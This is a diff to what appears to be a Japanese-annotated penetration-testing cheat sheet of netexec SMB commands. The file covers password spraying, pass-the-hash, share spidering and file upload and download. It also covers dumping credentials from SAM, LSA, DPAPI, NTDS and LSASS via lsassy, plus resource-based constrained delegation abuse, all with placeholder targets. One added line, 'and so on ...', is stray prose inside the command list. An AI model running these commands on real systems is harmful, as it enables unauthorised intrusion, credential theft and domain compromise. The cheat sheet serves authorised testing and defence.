@@ -12,6 +12,11 @@ netexec(rpcを使用するためTCP135番も使う)
 netexec smb 'IP' -u 'USERNAMELIST' -p 'PASSWORDLIST'
 # NTHASH
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -H 'NTHASH'
+# Spidering Shares
+netexec smb 'IP' -u '' -p '' --share 'SHARENAME' -M spider_plus
+# Get and Put Files
+netexec smb 'IP' -u '' -p '' --share 'SHARENAME' --get-file '/REMOTEPATH/./.' '/LOCALPATH/./.'
+netexec smb 'IP' -u '' -p '' --share 'SHARENAME' --put-file '/LOCALPATH/./.' '/REMOTEPATH/./.'
 # Enumeration
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --disks
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --interfaces
@@ -21,15 +26,16 @@ netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --pass-pol
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --rid-brute
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --shares
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --users
-# Spidering Shares
-netexec smb 'IP' -u '' -p '' --share 'SHARENAME' -M spider_plus
-# Get and Put Files
-netexec smb 'IP' -u '' -p '' --share 'SHARENAME' --get-file '/REMOTEPATH/./.' '/LOCALPATH/./.'
-netexec smb 'IP' -u '' -p '' --share 'SHARENAME' --put-file '/LOCALPATH/./.' '/REMOTEPATH/./.'
+# Checking for Spooler & WebDav
+netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M spooler
+netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M webdav
 # Obtaining Credentials
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --sam
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --lsa
+netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --dpapi
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M ntdsutil
+netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M lsassy
+and so on ...
 # RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity)
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --delegate 'ADMINISTRAOR'
 # S4U2Self
